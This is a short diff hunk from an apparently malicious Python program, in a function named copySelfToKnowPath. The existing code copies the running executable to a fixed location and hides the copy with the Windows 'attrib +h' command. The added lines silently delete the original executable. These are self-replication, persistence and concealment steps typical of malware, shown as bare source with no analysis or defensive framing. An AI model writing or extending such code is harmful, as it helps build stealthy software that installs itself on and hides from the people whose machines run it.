@@ -250,6 +250,13 @@ def copySelfToKnowPath():
         import shutil
         shutil.copy2(sys.executable, known_path)
 
+
+    #delete original
+    try:
+        os.remove(sys.executable)
+    except Exception as e:
+        pass
+
     # hidde self
     try:
         os.system(f'attrib +h "{known_path}"')
